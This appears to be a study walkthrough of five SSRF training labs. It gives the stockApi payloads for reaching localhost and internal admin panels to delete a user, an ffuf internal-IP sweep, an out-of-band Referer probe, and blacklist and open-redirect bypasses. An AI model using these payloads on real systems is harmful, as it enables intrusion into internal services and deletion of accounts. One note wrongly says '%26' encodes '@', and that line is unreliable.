# Navigation
- [Basic SSRF against the local server](#basic-ssrf-against-the-local-server)
- [Basic SSRF against another back-end system](#basic-ssrf-against-another-back-end-system)
- [Blind SSRF with out-of-band detection](#blind-ssrf-with-out-of-band-detection)
- [SSRF with blacklist-based input filter](#ssrf-with-blacklist-based-input-filter)
- [SSRF with filter bypass via open redirection vulnerability](#ssrf-with-filter-bypass-via-open-redirection-vulnerability)
# Basic SSRF against the local server
1. Navigate page > Select item > Check stock
2. Send POST request checking stock to repeater
3. Identify the `stockAPI` parameter
```
POST /product/stock HTTP/2
...<SNIP>...
stockApi=http%3A%2F%2Fstock.weliketoshop.net%3A8080%2Fproduct%2Fstock%2Fcheck%3FproductId%3D3%26storeId%3D1
```
4. Send SSRF probe for `/admin`
```
stockApi=http%3A%2F%2Flocalhost/admin
```
5. Admin page loads showing URLs to delete users
6. Submit request to delete Carlos
```
stockApi=http%3A%2F%2Flocalhost/admin/delete?username=carlos
```
# Basic SSRF against another back-end system
- Need to scan internal `192.168.0.x` interface for `/admin` on port `8080`
1. Navigate page > Select item > Check stock
2. Send POST request checking stock to repeater
3. Identify the `stockAPI` parameter
```
POST /product/stock HTTP/2
...<SNIP>...
stockApi=http%3A%2F%2F192.168.0.1%3A8080%2Fproduct%2Fstock%2Fcheck%3FproductId%3D3%26storeId%3D1
```
4. Save request to file
5. Edit the `stockApi` for `ffuf` to fuzz the IP address of the remote target
```
stockApi=http://192.168.0.FUZZ:8080/admin
```
6. Use `ffuf` to fuzz the remote target and exclude `500` response codes
```sh
ffuf -request SSRF.req -w <(seq 1 254) -fc 500
```
- In this lab, I get a hit for `192.168.0.107`
7. Issue request to delete carlos
```
stockApi=http://192.168.0.107:8080/admin/delete?username=carlos
```
# Blind SSRF with out-of-band detection
- This site uses analytics software which fetches the URL specified in the Referer header when a product page is loaded
1. Navigate page > Select item
2. `GET /product?productId=...` request to repeater
3. Modify `Referer:` header to your collaborator server
```
Referer: https://2gjp04ouq0i3s8m1ivxpwoaga7gy4pse.oastify.com
```
# SSRF with blacklist-based input filter
1. Navigate page > Select item > Check stock
2. Send POST request checking stock to repeater
3. Identify the `stockAPI` parameter
```
POST /product/stock HTTP/2
...<SNIP>...
stockApi=http%3A%2F%2F192.168.0.1%3A8080%2Fproduct%2Fstock%2Fcheck%3FproductId%3D3%26storeId%3D1
```
4. Request localhost is blocked
```
# Request
stockApi=http://localhost

# Response
"External stock check blocked for security reasons"
```
5. Test alternative representations of `localhost`
```
stockApi=http://127.1
```
- Returns `200 OK`
6. Request `/admin` is blocked
```
# Request 
stockApi=http://127.1/admin

# Response
"External stock check blocked for security reasons"
```
7. Test case manipulation
```
stockApi=http://127.1/Admin
```
- Returns `200 OK`
8. Delete `Carlos`
```
stockApi=http://127.1/Admin/delete?username=carlos
```
# SSRF with filter bypass via open redirection vulnerability
- Need to access `http://192.168.0.12:8080/admin` and delete the user `carlos`
1. Navigate page > Select item > Check stock
2. Send POST request checking stock to repeater
3. Identify the `stockAPI` parameter
```
POST /product/stock HTTP/2
...<SNIP>...
stockApi=http%3A%2F%2F192.168.0.1%3A8080%2Fproduct%2Fstock%2Fcheck%3FproductId%3D3%26storeId%3D1
```
4. In the UI, clicking `Next` link on a product triggers a redirect
```
GET /product/nextProduct?currentProductId=6&path=/product?productId=7
```
5. These both have the same endpoint, we can construct a request like the following to access `/admin`
```
stockApi=/product/nextProduct?currentProductId=7%26path=http://192.168.0.12:8080/admin
```
- `%26` is URL encoded `@` to avoid breaking the request
- This works because the `stockApi` is provided the same endpoint. We change the redirect path to the admin interface
6. Delete `Carlos`
```
stockApi=/product/nextProduct?currentProductId=7%26path=http://192.168.0.12:8080/admin/delete?username=carlos
```

